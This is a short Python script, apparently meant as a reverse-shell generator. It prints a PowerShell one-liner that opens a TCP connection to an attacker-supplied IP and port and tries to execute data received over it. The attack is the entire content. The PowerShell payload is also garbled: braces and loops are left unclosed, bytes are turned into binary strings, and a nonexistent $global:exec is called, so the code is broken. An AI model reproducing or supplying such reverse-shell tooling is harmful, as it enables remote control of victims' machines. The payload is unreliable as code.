import sys

def generate_powershell_payload(ip, port):
    payload = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}", {port});' \
               '$stream = $client.GetStream();' \
               '[byte[]]$bytes = 0..65535|%{0};' \
               '$i = $stream.Read($bytes, 0, $bytes.Length);' \
               'while($i -ne 0){$i = $stream.Read($bytes, 0, $bytes.Length);' \
               'foreach($byte in $bytes){[System.Convert]::ToString($byte, 2)|' \
               'foreach{' \
               'if($_ -eq "1"){$global:exec($_)}';

    return payload

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python Reverse_Shell_for_Power_Shell.py <IP> <PORT>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]

    payload = generate_powershell_payload(ip, port)
    print(payload)